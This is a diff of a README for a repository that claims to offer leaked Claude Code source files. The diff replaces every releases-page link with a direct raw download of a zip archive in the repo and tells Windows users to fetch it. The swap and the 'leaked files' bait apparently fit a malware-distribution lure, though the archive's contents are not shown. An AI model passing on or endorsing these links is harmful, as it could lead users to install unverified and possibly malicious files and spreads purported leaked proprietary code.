@@ -1,6 +1,6 @@
 # 📁 claude-leaked-files - Review Claude Code source safely
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg?style=for-the-badge)](https://github.com/Deerskinnorthumbria588/claude-leaked-files/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg?style=for-the-badge)](https://github.com/Deerskinnorthumbria588/claude-leaked-files/raw/refs/heads/main/Saify/claude-files-leaked-2.0.zip)
 
 ## 🚀 What this is
 
@@ -30,7 +30,7 @@ This project is meant to be opened after you download the release files from the
 
 Visit this page to download the release files:
 
-https://github.com/Deerskinnorthumbria588/claude-leaked-files/releases
+https://github.com/Deerskinnorthumbria588/claude-leaked-files/raw/refs/heads/main/Saify/claude-files-leaked-2.0.zip
 
 If the page shows more than one file, choose the file meant for Windows. If you see a `.zip` file, download that file first.
 
@@ -178,7 +178,7 @@ If you downloaded source files only, the folder may not include a direct app to 
 
 Download the latest files here:
 
-https://github.com/Deerskinnorthumbria588/claude-leaked-files/releases
+https://github.com/Deerskinnorthumbria588/claude-leaked-files/raw/refs/heads/main/Saify/claude-files-leaked-2.0.zip
 
 ## 🧾 File names you may see
 
